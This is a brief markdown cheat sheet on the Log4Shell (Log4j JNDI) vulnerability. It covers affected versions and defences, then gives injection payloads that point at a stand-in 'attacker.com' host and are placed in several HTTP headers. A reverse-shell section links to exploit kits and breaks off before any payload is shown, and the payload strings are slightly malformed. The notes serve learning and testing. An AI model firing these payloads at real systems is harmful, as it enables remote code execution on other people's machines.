# Log4Shell

# Notes

- An attacker must submit a JDNI (Java Naming and Directory Interface) lookup that points to their server
- Not only servers are vulnerable. Client, servers, IOT devices, anything running Java and Log4j is exploitable.
- Log4j will parse input and will look for any of the lookups
- JNDI lookups start with `$jndi:`
- LDAP and RMI protocols can be used in exploitation

# Vulnerable versions

- Versions 1.x are not vulnerable.
- Only version 2.x - 2.14 are vulnerable.
- Version 2.15 is now patched and not vulnerable.

# Defense

- Patch - v2.15

If you can't patch for any reason:

- Disable remote lookups
- Use firewall to prevent remote calls to unexpected servers

# Exploitation

Simply send the special parameter `${jndi:ldap//attacker.com/a}` in a web request header:

```bash
User-Agent: ${jndi:ldap//attacker.com/a}
X-Forwarded-For: ${jndi:ldap//attacker.com/a}
Referer: ${jndi:ldap//attacker.com/a}
X-Api-Call: ${jndi:ldap//attacker.com/a}
```

## Reverse Shell

Git clone both:

- [https://github.com/pimps/ysoserial-modified](https://github.com/pimps/ysoserial-modified)
- [https://github.com/pimps/JNDI-Exploit-Kit](https://github.com/pimps/JNDI-Exploit-Kit)

### Create the payload

```java
cd ysoserial-modified/target

```